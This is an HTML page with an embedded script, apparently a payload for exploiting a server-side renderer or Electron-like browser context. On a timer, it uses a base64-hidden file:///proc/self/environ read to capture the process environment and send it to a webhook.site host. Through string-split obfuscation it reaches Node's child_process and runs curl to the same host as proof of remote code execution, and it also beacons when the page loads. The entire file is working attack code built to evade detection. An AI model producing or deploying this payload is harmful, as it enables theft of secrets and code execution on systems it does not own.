<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Delayed LFI / RCE</title>
</head>
<body>
<script>
const h = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";

setTimeout(() => {
  try {
    // === Parte 1: LFI file:///proc/self/environ (camuflado)
    let p = "ZmlsZTovLy9wcm9jL3NlbGYvZW52aXJvbg==";
    fetch(atob(p)).then(r => r.text()).then(t => {
      fetch(h + "?env1=" + btoa(t.slice(0,100)));
      fetch(h + "?env2=" + btoa(t.slice(100,200)));
    }).catch(e => {
      fetch(h + "?env_error=" + encodeURIComponent(e.message));
    });
  } catch(e) {
    fetch(h + "?env_fail=" + encodeURIComponent(e.message));
  }
}, 3000); // Espera 3 segundos

setTimeout(() => {
  try {
    // === Parte 2: RCE evadido con Function
    let r = Function("ret"+"urn requ"+"ire")();
    r("child_"+"process").exec("curl " + h + "?rce=executed");
  } catch(e) {
    fetch(h + "?rce_error=" + encodeURIComponent(e.message));
  }
}, 6000); // Espera 6 segundos

// Confirmación mínima de ejecución (trigger neutral)
fetch(h + "?executed=1");
</script>
</body>
</html>
